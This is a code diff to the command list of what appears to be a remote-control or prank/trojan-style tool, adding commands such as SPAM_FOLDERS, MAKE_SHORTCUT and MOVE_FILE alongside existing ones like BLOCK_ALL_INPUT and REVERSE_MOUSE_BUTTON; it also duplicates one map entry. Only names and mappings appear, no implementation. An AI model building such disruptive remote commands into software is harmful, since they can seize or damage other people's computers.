@@ -12,7 +12,9 @@ class Command(Enum):
     DELETE_FILE = "DELETE_FILE"
     DELETE_FOLDER = "DELETE_FOLDER"
     MAKE_DIRECTORY = "MAKE_DIRECTORY"
-    
+    SPAM_FOLDERS = "SPAM_FOLDERS"
+    MAKE_SHORTCUT = "MAKE_SHORTCUT"
+    MOVE_FILE = "MOVE_FILE"
     # Input/Output Commands
     REVERSE_MOUSE_BUTTON = "REVERSE_MOUSE_BUTTON"
     BLOCK_ALL_INPUT = "BLOCK_ALL_INPUT"
@@ -113,6 +115,10 @@ command_response_map = {
     Command.DELETE_FILE: ResponseType.JSON_RESPONSE,
     Command.DELETE_FOLDER: ResponseType.JSON_RESPONSE,
     Command.MAKE_DIRECTORY: ResponseType.JSON_RESPONSE,
+    Command.MAKE_DIRECTORY: ResponseType.JSON_RESPONSE,
+    Command.SPAM_FOLDERS: ResponseType.JSON_RESPONSE,
+    Command.MAKE_SHORTCUT: ResponseType.JSON_RESPONSE,
+    Command.MOVE_FILE: ResponseType.JSON_RESPONSE,
 
     # Input/Output Commands
     Command.REVERSE_MOUSE_BUTTON: ResponseType.JSON_RESPONSE,
